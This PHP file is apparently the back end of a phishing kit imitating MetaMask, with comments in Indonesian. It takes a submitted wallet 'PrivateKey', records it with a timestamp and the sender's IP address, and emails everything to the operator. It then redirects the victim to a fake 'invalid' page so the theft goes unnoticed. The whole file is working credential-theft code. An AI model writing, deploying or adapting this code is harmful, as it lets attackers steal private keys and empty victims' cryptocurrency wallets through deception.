<?php 
error_reporting(E_ALL);
ini_set('display_errors', 1);

require 'email_config.php';

header("Content-Type: application/json");

// Periksa apakah request menggunakan metode POST
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $PrivateKey = null;

    // Cek apakah data dikirim dari FORM HTML (x-www-form-urlencoded)
    if (!empty($_POST["PrivateKey"])) {
        $PrivateKey = trim($_POST["PrivateKey"]);
    }

    // Cek apakah data dikirim dalam format JSON (raw)
    $json_data = json_decode(file_get_contents("php://input"), true);
    if (isset($json_data['PrivateKey'])) {
        $PrivateKey = trim($json_data['PrivateKey']);
    }

    if (!empty($PrivateKey)) {
        // Ambil waktu dan alamat IP pengirim
        date_default_timezone_set("Asia/Jakarta"); 
        $waktu = date("Y-m-d H:i:s");
        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';

        // Format data untuk disimpan
        $data = "PrivateKey    : $PrivateKey\n";
        $data .= "Waktu        : $waktu\n";
        $data .= "IP Address   : $ip_address\n";
        $data .= "-------------------------\n";

        // Simpan ke file (TIDAK AKAN BEKERJA DI VERCEL)
        // file_put_contents("BDFBREWQ7HJA7453BF986_______.txt", $data, FILE_APPEND);

        // Kirim email
        $subject = "Data PrivateKey Baru";
        kirim_email($subject, $data);

        // Redirect ke halaman sukses (Hanya berfungsi jika tidak ada output JSON)
        header("Location: /metamask/invalid.html");
        exit();
    } else {
        echo json_encode(["error" => "PrivateKey tidak ditemukan!"]);
    }
} else {
    echo json_encode(["error" => "Gunakan metode POST."]);
}
?>
